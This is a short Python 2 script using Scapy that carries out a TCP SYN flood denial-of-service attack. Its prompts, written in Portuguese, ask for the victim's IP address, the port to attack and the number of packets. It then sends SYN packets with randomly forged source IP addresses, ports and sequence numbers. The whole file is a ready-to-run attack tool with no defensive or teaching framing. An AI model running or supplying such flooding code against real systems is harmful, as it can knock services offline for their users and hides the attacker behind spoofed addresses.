import sys
import random
from scapy.all import *

def syn_flood(ip_destination,port_destination,limit):
	total = 0
	print "Enviando Pacotes"
	for x in range (0,limit):
		ip_packet = IP()
		ip_packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
		ip_packet.dst = ip_destination

		tcp_packet = TCP ()	
		tcp_packet.sport = random.randint(1000,9000)
		tcp_packet.dport = port_destination
		tcp_packet.flags = "S"
		tcp_packet.seq = random.randint(1000,9000)
		tcp_packet.window =random.randint(1000,9000)

		print("Source: "+ip_packet.src+":"+str(tcp_packet.sport))
		send(ip_packet/tcp_packet,verbose=0)
		total+=1
	

def main():

	victim_IP = raw_input ("\n"+"Insira o IP da vitima:")
	victim_port = input ("Insira a porta para ataque: ")
	limit = input ("Quantidade de pacotes a enviar:")
	syn_flood(victim_IP,victim_port,int(limit))

main()